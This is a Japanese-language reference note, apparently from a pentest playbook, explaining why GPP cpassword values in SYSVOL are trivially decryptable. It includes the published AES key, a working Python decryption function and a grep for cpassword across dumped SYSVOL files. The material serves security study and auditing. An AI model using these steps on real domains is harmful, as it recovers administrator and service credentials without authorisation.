# GPP cpassword の暗号化と復号原理

## このファイルの位置づけ

`01_Reconnaissance/SMB_Enumeration.md` の「GPP (Group Policy Preferences) 認証情報の取得」セクションで扱う `cpassword` が **なぜ誰でも復号できるのか** を説明するファイル。
`02_Initial_Access/Credential_Discovery.md` の GPP cpassword 復号パターンからも参照する。

手順そのものは作業ファイル側で完結している。このファイルは「環境が変わったとき・パッチ済みと聞いたときにどう判断するか」を考えるための背景知識として使う。

---

## Group Policy Preferences (GPP) とは何か

GPP は Windows Server 2008 で導入された「グループポリシーの拡張機能」。従来の GPO では不可能だった以下の操作をドメイン全体へ一括配布できるようにした。

- ローカル管理者アカウントの作成・パスワード変更
- マップドライブの設定（資格情報付き）
- スケジュールタスクの配布（実行ユーザーの資格情報付き）
- サービスの作成（実行ユーザーの資格情報付き）
- データソース接続（DB認証情報付き）

これらの設定は GPO の本体とともに SYSVOL 配下の XML ファイル（`Groups.xml` / `Services.xml` / `ScheduledTasks.xml` / `Drives.xml` / `DataSources.xml` / `Printers.xml`）として保存され、ドメイン参加PCが定期的に取得・適用する。

---

## なぜ SYSVOL が読めるのか

SYSVOL 共有は GPO の配布元であり、**ドメイン参加端末（＝認証済みユーザー全員）が読み取りできる**ように設計されている。これは仕様であってミス設定ではない。

| プリンシパル | SYSVOL への権限 |
|------------|---------------|
| Authenticated Users | 読み取り・実行 |
| Domain Computers | 読み取り・実行 |
| Server Operators | 変更 |
| Domain Admins | フルコントロール |

**結論：低権限ドメインユーザー1人分の認証情報が手に入れば、GPP 関連 XML はすべて読める。**

さらに匿名 SMB セッションが許可されている環境（古い設定・意図的なゲスト許可）では認証情報すら不要で SYSVOL に到達できる場合がある。

---

## cpassword 暗号化の仕様

GPP のパスワードは `Groups.xml` 等の `cpassword=` 属性に **AES-256-CBC** で暗号化して格納される。

```xml
<User ...>
  <Properties
    action="U"
    newName=""
    fullName=""
    description=""
    cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
    changeLogon="0"
    noChange="1"
    neverExpires="1"
    acctDisabled="0"
    userName="Administrator (built-in)"/>
</User>
```

**暗号化の構造：**
- アルゴリズム: AES-256-CBC
- IV: 固定値（全ての `cpassword` で同じ）
- Key: 固定値（32バイト）
- 出力: Base64 エンコード

**致命的な設計ミス：**
Microsoft は AES 鍵を MSDN のドキュメント（MS-GPPREF §2.2.1.1.4）で公開してしまった。

```
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
```

鍵が固定かつ公開されているため、`cpassword=` 値を取得できた瞬間に誰でも復号できる。これは実装バグではなく設計上の選択（ドメイン参加PCが自分で復号できる必要があった）。

---

## MS14-025 パッチ後の挙動

2014年に MS14-025 がリリースされ、以下の挙動に変わった：

- **新規の GPP ではパスワードを設定できなくなった**（GUI からの入力が無効化）
- **既存の GPP XML に残った `cpassword` は削除されない**（互換性のため）

つまり「パッチ適用済み」でも、2014年以前に作成された GPP 設定がそのまま残っていれば今でも復号できる。**多くの組織で `cpassword` は残存している。**

**「MS14-025 適用済みだから安全」という主張は信用してはいけない。** 必ず XML を実際に確認する。

---

## 復号の仕組み（なぜ gpp-decrypt で一瞬で解けるか）

`gpp-decrypt` や PowerSploit の `Get-GPPPassword` は、上記の固定鍵と IV を内蔵しており、受け取った Base64 文字列を以下の流れで復号する：

```
1. Base64 文字列をパディング調整（`=` が省略されることがある）
2. Base64 デコード → 暗号化バイト列
3. AES-256-CBC で復号（固定鍵・固定IV）
4. UTF-16LE でデコード
5. PKCS#7 パディング除去
```

この処理は Python でも数行で書ける：

```python
from Crypto.Cipher import AES
import base64

KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b"
)
IV = b"\x00" * 16

def decrypt_cpassword(cpassword: str) -> str:
    # Base64 パディング調整
    pad = "=" * ((4 - len(cpassword) % 4) % 4)
    encrypted = base64.b64decode(cpassword + pad)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    plain = cipher.decrypt(encrypted)
    # UTF-16LE + PKCS#7 パディング除去
    return plain.decode("utf-16-le").rstrip("\x00").rstrip()
```

手元に `gpp-decrypt` が無い環境でも、この10行程度のスクリプトで復号できる。

---

## 対象となる XML ファイルの範囲

`Groups.xml` 以外にも `cpassword` を含む可能性がある XML：

| ファイル | 含まれる認証情報 |
|---------|--------------|
| `Groups.xml` | ローカルユーザー・ローカルグループのパスワード |
| `Services.xml` | サービス実行アカウントのパスワード |
| `ScheduledTasks.xml` | スケジュールタスク実行アカウントのパスワード |
| `Drives.xml` | マップドライブの接続資格情報 |
| `DataSources.xml` | DB 接続文字列内の資格情報 |
| `Printers.xml` | プリンタ接続の資格情報 |

SYSVOL 配下で `cpassword` を grep すればファイル名に関係なく拾える：

```bash
# SYSVOL 配下のダウンロード後
grep -ril "cpassword" /tmp/sysvol_dump/
```

---

## 環境が変わったときに確認すべき場所

| 状況 | 確認すること |
|------|-----------|
| `Groups.xml` に `cpassword` が見つからない | 他の XML（Services/ScheduledTasks/Drives）を確認 |
| SYSVOL にアクセスできない | 匿名拒否 → 低権限認証情報を取得してから再試行 |
| `cpassword` の値が空（`cpassword=""`）| 空欄時の挙動。パスワードが設定されていない設定エントリ |
| 復号結果が文字化け・空文字 | パディング調整ミスか UTF-16LE デコード漏れ。手動スクリプトで確認 |
| MS14-025 適用済みと言われた | 既存 XML は残っている可能性あり。必ず実ファイルを確認 |
| GPP 由来ではなく LAPS 運用の環境 | LAPS のパスワードは ms-Mcs-AdmPwd 属性に保存される。LDAP から `ExtendedRights` があるユーザーで取得する別経路になる |

---

## 関連

- 手順（SMB 側からの発見と取得） → `../01_Reconnaissance/SMB_Enumeration.md`
- 手順（Credential Discovery としての位置づけ） → `../02_Initial_Access/Credential_Discovery.md`
- SYSVOL ナビゲーション観点 → `../01_Reconnaissance/SMB_Enumeration.md`
- Playbook での分岐 → `../00_Playbook/Windows_AD_Attack_Flow.md`
